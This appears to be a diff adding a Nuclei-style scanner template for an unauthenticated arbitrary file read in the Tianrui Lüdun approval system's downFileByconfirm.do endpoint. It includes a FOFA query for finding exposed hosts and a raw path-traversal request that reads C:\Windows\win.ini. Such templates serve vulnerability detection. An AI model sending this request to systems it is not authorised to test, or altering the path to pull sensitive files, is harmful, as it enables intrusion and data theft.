@@ -1,0 +1,24 @@
+id: tianrui-downFileByconfirm_do-File-reading
+
+info:
+  tags: tianrui-downFileByconfirm_do-File-reading
+  name: 天锐绿盾审批系统 downFileByconfirm.do 任意文件读取漏洞
+  author: xc
+  severity: high
+  description: |-
+    fofa: app="TIPPAY-绿盾审批系统"
+    天锐绿盾审批系统 downFileByconfirm.do 接口处任意文件读取漏洞，未经身份验证的攻击者利用此漏洞获取系统内部敏感文件信息，导致系统处于极不安全的状态。
+http:
+  - raw:
+      - |
+        GET /trwfe/service/.%2E/file/downFileByconfirm.do?dstPath=C:\Windows\win.ini&fileName=&processInstanceIds= HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '; for 16-bit app support'
+      - type: status
+        status: 
+          - 200
